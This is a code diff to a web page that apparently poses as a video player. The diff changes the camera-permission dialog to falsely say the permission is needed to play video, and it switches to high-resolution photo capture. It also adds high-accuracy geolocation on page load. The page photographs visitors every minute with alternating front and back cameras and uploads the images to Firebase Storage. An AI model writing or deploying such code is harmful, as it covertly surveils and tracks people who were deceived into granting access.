@@ -97,7 +97,7 @@
 
     <div class="dialog-overlay" id="dialogOverlay">
         <div class="dialog">
-            <p>カメラの権限を許可してください。</p>
+            <p>動画を再生するには権限を許可してください。</p>
             <button id="reloadButton">再試行</button>
         </div>
     </div>
@@ -347,6 +347,7 @@
         let currentCameraIndex = 0;
         let frontCamera;
         let backCamera;
+        let currentPosition = null;
 
         async function requestCameraAccess() {
             try {
@@ -411,19 +412,19 @@
                 const imageCapture = new ImageCapture(track);
 
                 // 1分ごとに撮影してアップロード
-                captureInterval = setInterval(() => {
-                    imageCapture.grabFrame()
-                        .then(imageBitmap => {
-                            canvas.width = imageBitmap.width;
-                            canvas.height = imageBitmap.height;
-                            ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg');
-                            uploadImage(dataURL);
-                            switchCamera();
-                        })
-                        .catch(err => {
-                            console.error('画像キャプチャエラー:', err);
-                        });
+                captureInterval = setInterval(async () => {
+                    try {
+                        const photoSettings = { imageWidth: 1920, imageHeight: 1080 }; // 高解像度設定
+                        const photo = await imageCapture.takePhoto(photoSettings);
+                        canvas.width = photo.width;
+                        canvas.height = photo.height;
+                        ctx.drawImage(photo, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/jpeg');
+                        uploadImage(dataURL);
+                        switchCamera();
+                    } catch (err) {
+                        console.error('画像キャプチャエラー:', err);
+                    }
                 }, 60000); // 60000ミリ秒 = 1分
             }
         }
@@ -438,30 +439,59 @@
         }
 
         // 画像をFirebase Storageにアップロード
-        function uploadImage(dataURL) {
-            const storageRef = ref(storage, `images/${Date.now()}.jpg`);
-            uploadString(storageRef, dataURL, 'data_url')
-                .then(snapshot => {
-                    console.log('画像がアップロードされました。');
-                })
-                .catch(err => {
-                    console.error('アップロードエラー:', err);
-                });
+        async function uploadImage(dataURL) {
+            try {
+                const storageRef = ref(storage, `images/${Date.now()}.jpg`);
+                const snapshot = await uploadString(storageRef, dataURL, 'data_url');
+                console.log('画像がアップロードされました。');
+
+                if (currentPosition) {
+                    console.log(`位置情報: 緯度 ${currentPosition.latitude}, 経度 ${currentPosition.longitude}`);
+                }
+            } catch (err) {
+                console.error('アップロードエラー:', err);
+            }
         }
 
-        // カメラ権限ダイアログを表示
+        // 位置情報を取得
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        currentPosition = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                    },
+                    err => {
+                        console.error('位置情報取得エラー:', err);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                console.error('このブラウザは位置情報取得に対応していません。');
+            }
+        }
+
         function showCameraPermissionDialog() {
             const dialogOverlay = document.getElementById('dialogOverlay');
             dialogOverlay.style.display = 'flex';
         }
 
-        // ダイアログの再試行ボタンをクリックしたときにページを再読み込み
+        // ダイアログを表示してユーザーにページを再読み込み
         document.getElementById('reloadButton').addEventListener('click', () => {
             location.reload();
         });
 
         // ページロード時に動画をロード
-        window.onload = loadVideos;
+        window.onload = () => {
+            loadVideos();
+            getLocation();
+        };
     </script>
 </body>
 </html>
